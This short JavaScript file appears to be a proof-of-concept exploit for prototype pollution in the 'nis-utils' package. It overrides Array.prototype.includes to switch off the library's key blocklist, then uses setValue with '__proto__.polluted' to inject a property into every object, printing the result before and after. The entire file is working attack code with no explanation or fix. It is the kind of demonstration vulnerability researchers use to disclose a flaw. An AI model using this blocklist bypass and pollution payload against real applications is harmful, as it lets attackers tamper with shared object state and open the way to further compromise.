Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const nisUtils = require('nis-utils');
const object1 = {};
console.log({}.polluted);
nisUtils.object.setValue({}, '__proto__.polluted', 'yes');
console.log({}.polluted);